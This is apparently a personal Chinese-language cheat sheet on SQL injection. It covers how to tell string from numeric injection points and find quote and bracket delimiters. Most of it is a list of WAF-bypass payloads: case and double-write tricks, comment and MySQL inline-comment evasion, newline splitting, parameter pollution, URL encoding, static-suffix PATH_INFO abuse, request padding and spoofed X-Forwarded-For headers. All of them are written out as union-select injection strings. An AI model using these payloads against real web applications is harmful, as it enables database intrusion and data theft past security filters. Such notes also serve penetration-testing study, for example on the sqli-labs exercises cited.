判断字符型注入还是数字型注入
判断隔断符是''还是""或者()和('')隔断
如果判断出隔断符是单引或者双引号后，就需要测试外部有多少个括号,无需担心括号和引号交叠使用,他只会以最外面的引号当隔断，内部只是普通字符串,无需管理
列如:
select * from user where id=(('('()')'));他只会以((''))当隔断,内部多余('()')被当成字符串,只需找到最外层''外面还加了几个括号就行
判断过滤词汇:
waf绕过使用:
--空格检测:
用&09,%0a,/**/替换
--大小写绕过
select username from user UNION select password from user
--双写绕过,用于删除类绕开
select username from user ununionion select password from user--通过ununionion删除关键字后拼接绕过union关键字的过滤
--普通注释穿插绕过,会将注释转换成空格,用于正则匹配
select username from user union/**/select password from user
select username from user union select database/**/()--注释穿插绕过union关键字,仅限于过滤完整组合词和函数名与括号之间，如果过滤单独如union之类的子串就用内联注释
--内联注释,mysql专属,会将/*!内容*/里的内容当成代码执行
select * from user /*!union*/ select password from user--内联注释绕过union关键字让mysql执行union语句
--换行绕过匹配,用于绕过一行检测
select username from user union#%0aselect password from user-->%0a换行将注入语句分成两行,绕过第一行检测
select username from user union#
select password from user
--参数污染绕过,通过在参数后面添加一个同名参数来覆盖原有参数值
id=1/*&id=2 union select 1,2,3#*/通过添加一个同名参数覆盖原有参数值来绕过过滤
第一个id=1/*,第二个id=2 union select 1,2,3#*/，第一个参数值被第二个参数值覆盖,绕过过滤
sql语句select * from user where id=1/*&id=2 union select 1,2,3#*/,污染进入sql语句后变成select * from user where id=2 union select 1,2,3#*/，绕过过滤
--url编码转换绕过
select——>%73%65%6C%65%63%74
%73%65%6C%65%63%74 username from user
--静态资源绕过,Apache/Nginx PHP 路径解析特性（PATH_INFO）
通过在url目录后添加.jpg .png .gif .ico .css .js .txt .svg .woff .ttf之类的文档,WAF默认对静态资源目录/后缀直接放行不做攻击检测,将注入语句写在后面
演示:sqlilabs/Less-1.php/1' union select 1,2,3--+.jpg
$id = $_SERVER['PATH_INFO'];
$sql = "select * from users where id=$id";
select * from users where id=1' union select 1,2,3--+.jpg
--分号绕过,添加分号使waf接触直接放行
index.php;admin?id=1' union select 1,2,3--+
index.php/1.jpg?id=2 union select 1,2,3
-- 缓冲区绕过
通过填充大量字符来修改get请求或post请求体,让waf接受溢出,无法接受后面的注入语句达成绕过
?id=1aaaaaaaaaaaa...(几千个a)...' union select 1,2,3--+
--ip白名单绕过
通过修改请求头XFF/Real-IP 来伪造ip绕过waf限制或直接得到信任不被检测